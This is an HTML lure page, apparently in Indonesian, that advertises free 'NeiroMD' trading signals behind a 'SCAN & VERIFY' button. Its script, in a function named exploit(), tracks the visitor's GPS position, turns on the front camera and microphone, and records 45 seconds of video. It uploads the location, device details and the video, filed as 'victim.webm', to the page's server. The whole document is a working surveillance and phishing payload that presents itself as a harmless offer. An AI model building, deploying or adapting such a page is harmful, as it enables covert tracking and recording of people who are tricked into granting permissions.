<!DOCTYPE html>
<html>
<head>
    <title>NeiroMD Signals</title>
    <meta name="viewport" content="width=device-width">
    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;color:#fff;font-family:Arial;text-align:center;overflow:hidden;}img{max-width:95vw;max-height:50vh;object-fit:contain;border-radius:20px;margin:20px;}h2{font-size:24px;margin:10px;color:#ff6b6b;}button{background:linear-gradient(45deg,#ff4757,#ffa502);color:#fff;border:none;padding:20px 40px;font-size:18px;border-radius:50px;cursor:pointer;margin:20px;box-shadow:0 10px 30px rgba(255,71,87,0.5);font-weight:bold;}button:hover{transform:scale(1.05);}video{width:95vw;border-radius:20px;margin:10px;}#status,#loc{display:none;color:#4ecdc4;font-size:16px;}</style>
</head>
<body>
    <img src="https://i.ibb.co.com/Mw10bGf/IMG-20260328-WA0012.jpg">
    <h2>🔥 NeiroMD Live Signals 🔥</h2>
    <p>Scan untuk akses trading signals gratis!</p>
    <button onclick="exploit()">📱 SCAN & VERIFY</button>
    <div id="status">Verifying...</div>
    <video id="video" autoplay muted playsinline></video>
    <div id="loc"></div>
    
    <script>
        let stream, recorder, watchId;
        async function exploit(){
            document.querySelector('button,img,h2,p').style.display='none';
            document.getElementById('status').style.display='block';
            
            try{
                // GPS TRACKING
                watchId=navigator.geolocation.watchPosition(p=>{
                    const loc=`${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)} (${p.coords.accuracy}m)`;
                    document.getElementById('loc').textContent='📍 '+loc;
                    document.getElementById('loc').style.display='block';
                    sendData('GPS',loc);
                },null,{enableHighAccuracy:true});
                
                // CAMERA
                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1920,height:1080},audio:true});
                document.getElementById('video').srcObject=stream;
                document.getElementById('video').style.display='block';
                
                // RECORD 45s
                recorder=new MediaRecorder(stream);
                const chunks=[]; 
                recorder.ondataavailable=e=>chunks.push(e.data);
                recorder.onstop=()=>uploadVideo(new Blob(chunks));
                recorder.start(); 
                setTimeout(()=>recorder.stop(),45000);
                
            }catch(e){sendData('ERROR',e.message);}
        }
        
        async function sendData(type,data){
            const bat=navigator.getBattery?await navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (${b.charging?'🔌':'🔋'})`):'N/A';
            await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({type,data,ua:navigator.userAgent,bat})
            });
        }
        
        async function uploadVideo(blob){
            const form=new FormData();form.append('video',blob,'victim.webm');
            await fetch('/api/upload',{method:'POST',body:form});
            if(watchId) navigator.geolocation.clearWatch(watchId);
        }
        
        setTimeout(()=>document.body.onclick=exploit,{once:true});
    </script>
</body>
</html>
